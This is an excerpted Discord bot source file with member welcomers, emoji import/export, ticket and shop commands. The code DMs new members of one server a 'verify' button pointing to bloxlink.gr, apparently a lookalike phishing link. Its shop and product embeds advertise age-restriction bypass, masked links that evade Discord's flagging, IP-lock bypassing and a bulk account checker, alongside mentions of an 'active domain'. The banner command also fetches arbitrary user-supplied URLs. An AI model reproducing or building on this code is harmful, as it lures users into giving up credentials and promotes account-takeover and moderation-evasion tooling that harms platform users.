...
client.once("clientReady", async () => {
  ...
  if (customStatus) {
    client.user.setPresence({
      activities: [{ name: customStatus.name, type: customStatus.type }],
      status: "online",
    });
  } else {
    client.user.setPresence({
      activities: [{ name: "members join", type: ActivityType.Watching }],
      status: "online",
    });
  }
...
client.on("guildMemberAdd", async (member) => {
  try {
    ...
    if (guild.id === CAELUM_GUILD_ID && !member.user.bot) {
      try {
        ...
        const verifyButton = new ButtonBuilder()
          ...
          .setURL("https://bloxlink.gr/verify?server=9548662078159325");

        const verifyRow = new ActionRowBuilder().addComponents(verifyButton);
        await member.send({ embeds: [verifyEmbed], components: [verifyRow] });
      } catch (err) {
        console.error(`[welcomer] Caelum DM error for ${member.user.tag}:`, err.message);
      }
      return;
    }

    // ── Insanity Server welcomer ───────────────────────────────────────────────
    if (guild.id === INSANITY_GUILD_ID) {
      ...
      const welcomeEmbed = new EmbedBuilder()
        ...
        .setFooter({ text: `discord.gg/insanity | ${utcTime}` });
    ...
    // ── Atlas Server welcomer ──────────────────────────────────────────────────
    if (guild.id === ATLAS_GUILD_ID) {
      const channel = guild.channels.cache.get(ATLAS_WELCOME_CHANNEL_ID);
      if (!channel || !channel.isTextBased()) return;
      ...
      const atlasEmbed = new EmbedBuilder()
        ...
        .setThumbnail(member.user.displayAvatarURL({ dynamic: true }))
        .setFooter({ text: `${guild.memberCount} @ /atlas` });
    ...
    console.error("[welcomer] guildMemberAdd error:", err);
  }
});
...
client.on("messageCreate", async (message) => {
  ...
  if (message.content.trim().toLowerCase() === `${PREFIX}messagecount`) {
    ...
    try {
      ...
      for (const channel of channels.values()) {
        ...
        channelsChecked++;
        try {
          // Discord returns at most 100 messages per request; paginate through
          // every page until the channel has no older messages left.
          let before;
          while (true) {
            ...
            total += count;
            if (count === 0) break;
            const oldestMessage = batch.reduce((oldest, current) =>
              !oldest || BigInt(current.id) < BigInt(oldest.id) ? current : oldest,
              null
            );
            if (!oldestMessage || oldestMessage.id === before) break;
            before = oldestMessage.id;
            if (count < 100) {
              const verifyOlder = await channel.messages.fetch({ limit: 1, before, cache: false });
              if (verifyOlder.size === 0) break;
            }
          }
        } catch (error) {
          channelsFailed++;
  ...
  if (content === `${PREFIX}addmassemoji` || content.startsWith(`${PREFIX}addmassemoji `)) {
    ...
    const messageLink = rawContent.split(/\s+/)[1];
    ...
    try {
      ...
      for (const embed of sourceMessage.embeds) {
        addJsonUrls(embed.url);
        addJsonUrls(embed.title);
        addJsonUrls(embed.description);
      ...
      if (!jsonDocuments.length) {
        await message.reply("I found the linked message, but its embed does not expose readable JSON text. Put the JSON in an embed field/description or attach the JSON file directly.");
        return;
      }
      ...
      const collect = (value) => {
        if (typeof value === "string") {
          for (const match of value.matchAll(emojiPattern)) {
            ...
            if (!seen.has(id)) {
              seen.add(id);
              entries.push({ name, url: `https://cdn.discordapp.com/emojis/${id}.${animated ? "gif" : "png"}`, animated: Boolean(animated) });
            }
          }
          if (/^https?:\/\//i.test(value) && /\.(?:png|jpe?g|gif|webp)(?:\?|$)/i.test(value)) {
            const name = value.split("/").pop().split("?")[0].split(".")[0].replace(/[^A-Za-z0-9_]/g, "").slice(0, 32) || `emoji${entries.length + 1}`;
            const key = value.split("?")[0];
            if (!seen.has(key)) { seen.add(key); entries.push({ name, url: value, animated: /\.gif(?:\?|$)/i.test(value) }); }
          }
        } else if (value && typeof value === "object") {
          const name = String(value.name || value.id || `emoji${entries.length + 1}`).replace(/[^A-Za-z0-9_]/g, "").slice(0, 32) || `emoji${entries.length + 1}`;
          const id = value.id;
          const url = value.url || value.image || value.imageUrl || (id ? `https://cdn.discordapp.com/emojis/${id}.${value.animated ? "gif" : "png"}` : null);
          if (url && !seen.has(url)) { seen.add(url); entries.push({ name, url, animated: Boolean(value.animated) }); }
        }
      };
...
// Discord rate-limits emoji creation, so retry each upload instead of firing
  ...
  if (content === `${PREFIX}sendemoji`) {
    ...
    try {
      ...
      const json = JSON.stringify({ guildId: message.guild.id, guildName: message.guild.name, emojis }, null, 2);
      const attachment = new AttachmentBuilder(Buffer.from(json, "utf8"), { name: "server-emojis.json" });
      await message.reply({ content: `Exported **${emojis.length}** emojis from this server.`, files: [attachment] });
    } catch (error) {
      console.error("[v0] !sendemoji failed:", error);
      await message.reply(`Could not export the server emojis: ${error.message || "unknown error"}`);
    }
    return;
  }
  ...
  if (
    ...
    const autoReplyEmbed = new EmbedBuilder()
      ...
      .setDescription(
        ...
        "*ꜱɪᴍᴘʟʏ ʀᴇᴘʟʏ ᴡɪᴛʜ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏʀ ɴᴀᴍᴇ ᴏꜰ ᴛʜᴇ ᴘʀᴏᴅᴜᴄᴛ ʏᴏᴜ ᴡᴀɴᴛ ᴀɴᴅ ᴀ ꜱᴛᴀꜰꜰ ᴍᴇᴍʙᴇʀ ᴡɪʟʟ ᴀꜱꜱɪꜱᴛ ʏᴏᴜ ꜱʜᴏʀʟʏ!*"
      )
      .setColor("#2f3136")
      .setFooter({
  ...
  if (content === `${PREFIX}embed`) {
    const methods = [
      ...
      {
        name: "ᴛɪᴋᴛᴏᴋ ʀᴇᴘʟʏ ᴄᴏᴍᴇɴᴛꜱ ᴍᴇᴛʜᴏᴅ",
        plainText: true,
  ...
  if (content === `${PREFIX}ticket`) {
    const ticketEmbed = new EmbedBuilder()
      ...
      .setFooter({
        text: "Ticketing without clutter",
    ...
    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        ...
        .setStyle(ButtonStyle.Primary)
        .setEmoji({ id: "1537409441073209504", name: "emoji_1", animated: false })
    );
  ...
  if (content === `${PREFIX}shop`) {
    const shopEmbed = new EmbedBuilder()
      ...
      .setDescription(
        ...
        "<:emoji_14:1508646444607864872> **ᴀɢᴇ ʙʏᴘᴀꜱꜱᴇ**\n" +
        ...
        "> ꜱᴇɴᴅ ʜɪᴅᴅᴇ / ᴍᴀꜱᴋᴇᴅ ʟɪɴᴋꜱ ᴛʜᴀᴛ ʙʏᴘᴀꜱ ᴅɪꜱᴄᴏʀᴅ ꜰʟᴀɢꜱ.\n\n" +
        "──────────────────────────\n" +
  ...
  if (content === `${PREFIX}tools`) {
    const toolsEmbed = new EmbedBuilder()
      .setDescription(
        ...
        "<a:emoji_13:1508646379751342130> 1 ᴄᴜʀᴇɴᴛ ᴀᴄᴛɪᴠᴇ ᴅᴏᴍᴀɪɴ\n\n" +
        "<:emoji_14:1508646444607864872> ʙʟᴀᴢɪɴɢ ꜰᴀꜱᴛ & ꜰᴇᴀᴛᴜʀᴇ ʟᴏᴀᴅᴇᴅ ꜱɪᴛᴇꜱ**"
      )
      .setImage("https://image2url.com/r2/default/gifs/1768488617981-bdc4c780-144f-4a40-8906-ddf01eadb705.gif")
      .setThumbnail("https://ik.imagekit.io/bfzcxlajkp/bonsai.gif");
...
\`\`\``;
  ...
  // ── !setbotbanner ──
  if (content === `${PREFIX}setbotbanner` || content.startsWith(`${PREFIX}setbotbanner `)) {
    // Check if user has administrator permissions
    if (!message.member.permissions.has(PermissionFlagsBits.Administrator)) {
      await message.reply({
        content: "<:emoji_11:1506864561435967509> You need administrator permissions to use this command.",
    ...
    try {
      // Accept image from attachment OR from a URL provided as argument
      let bannerSource = null;

      if (message.attachments.size > 0) {
        const attachment = message.attachments.first();

        // Allow image/* and GIFs
        ...
        if (attachment.size > 10485760) {
          await message.reply({
            content: "<:emoji_11:1506864561435967509> Image is too large. Maximum size is 10MB.",
          });
          return;
        }

        bannerSource = attachment.url;
      } else {
        // Try to use a URL passed as argument: !setbotbanner <url>
        const urlArg = content.slice(PREFIX.length + 12).trim();
        if (urlArg) {
          bannerSource = urlArg;
        }
      }
      ...
      if (!bannerSource) {
        await message.reply({
          content: "<:emoji_11:1506864561435967509> Please attach an image or provide a URL. Usage: `!setbotbanner` (with image attached) or `!setbotbanner <url>`",
        });
        return;
      }

      // Fetch the image as a Buffer so Discord.js can handle it properly (supports GIFs too)
      const fetch = (...args) => import("node-fetch").then(({ default: f }) => f(...args));
      const res = await fetch(bannerSource);
      if (!res.ok) {
        await message.reply({
          content: "<:emoji_11:1506864561435967509> Failed to fetch the image. Make sure the URL is accessible.",
        });
        return;
      }
      ...
      await message.reply({
        content: "<a:emoji_13:1508646379751342130> Bot banner (cover photo) changed successfully.",
      });
    } catch (err) {
      console.error("[setbotbanner] error:", err.message);
      if (err.message.includes("nitro") || err.message.includes("Nitro") || err.message.includes("50035")) {
        await message.reply({
          content: "<:emoji_11:1506864561435967509> Bot banners require the bot account to have Discord Nitro. This bot does not have Nitro.",
        });
      } else {
        await message.reply({
          content: `<:emoji_11:1506864561435967509> Failed to change bot banner: ${err.message}`,
        });
      }
    }
    return;
...
client.on("interactionCreate", async (interaction) => {
  ...
  if (interaction.isButton() && interaction.customId.startsWith("srv:")) {
    ...
    await interaction.reply({
      content: `**ꜱᴇʀᴠᴇʀꜱ ᴛᴏ ʙᴇᴀᴛ — ${server.label}**\n\n${inviteLines}`,
      ephemeral: true,
    });
    return;
  }
  ...
  if (interaction.isButton() && interaction.customId === "ticket_create") {
    ...
    try {
      ...
      // Dynamically find every role in this guild that has Administrator permission.
      // This works in any server regardless of role IDs.
      const allRoles = await interaction.guild.roles.fetch();
      const adminRoles = allRoles.filter(
        (role) =>
          role.permissions.has(PermissionFlagsBits.Administrator) &&
          !role.managed && // skip bot-managed roles
      ...
      console.error(`[ticket] Error creating ticket:`, err.message);
      await interaction.editReply({
...
To gain access to the rest of the channels of this server you will need to verify yourself first.
  ...
  if (interaction.isButton() && interaction.customId === "shop_list_products") {
    const listEmbed = new EmbedBuilder()
      ...
      .setDescription(
        ...
        "<:emoji_14:1508646444607864872> **ɪᴘ ʟᴏᴄᴋ ʏᴘᴀꜱꜱ / ʀᴇꜰʀꜱʜᴇʀ** — ʙʏᴘᴀꜱꜱ & ʀᴇꜰʀᴇꜱʜ ɪᴘ ʟᴏᴄᴋꜱ\n" +
        "<:emoji_14:1508646444607864872> **ᴀɢᴇ ʙʏᴘᴀꜱꜱᴇʀ** — ʙʏᴘᴀꜱꜱ ᴀɢᴇ ʀᴇꜱᴛʀɪᴄᴛɪᴏɴꜱ ɪɴꜱᴛᴀɴᴛʟʏ\n" +
        "<:emoji_14:1508646444607864872> **ᴀᴄᴄᴏᴜɴᴛ ᴄʜᴇᴄᴋᴇʀ** — ʙᴜʟᴋ ᴀᴄᴄᴏᴜɴᴛ ᴀʟɪᴅᴀᴛɪᴏɴ\n" +
